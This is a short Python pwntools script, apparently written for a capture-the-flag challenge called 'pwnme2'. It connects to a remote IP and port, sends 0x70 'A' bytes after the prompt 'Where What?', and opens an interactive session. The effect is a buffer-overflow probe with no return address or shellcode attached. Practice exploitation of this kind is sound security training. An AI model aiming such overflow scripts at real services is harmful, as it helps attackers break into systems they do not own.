#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x080486f6'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

elf = ELF('/home/h11p/hackme/pwnme2')

#io = process('/home/h11p/hackme/pwnme2')

io = remote('104.224.169.128', 18887)

offset=0x70

payload = 'A' * offset
#debug()
io.recvuntil('Where What?')
io.sendline(payload)
io.interactive()
io.close()

